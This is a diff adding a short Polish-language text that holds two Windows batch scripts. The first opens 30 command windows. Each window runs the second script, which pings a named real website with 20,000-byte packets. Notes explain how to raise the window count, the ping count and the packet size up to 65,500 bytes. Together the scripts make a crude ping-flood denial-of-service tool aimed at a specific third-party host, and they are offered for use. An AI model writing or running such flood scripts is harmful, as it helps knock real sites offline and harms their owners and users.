@@ -1,0 +1,15 @@
+PLIK 1 (TEN DO ODPALANIA) (___.bat)
+  for /L %%A IN (1,1,30) DO (
+  start "New Window" cmd /c ping.bat
+  )
+  
+PLIK 2 (ping.bat)
+  @%SystemRoot%\system32\ping.exe -n 10 -l 20000 informatyka-wisnowa.prv.pl
+  
+Do zamiany:
+  W pliku 1:
+  30 : liczba otwieranych okien
+  
+  W pliku 2:
+  -n 10 : liczba pingow w jednym oknie
+  -l 20000 : liczba bajtow ktore wysylasz (max 65500)
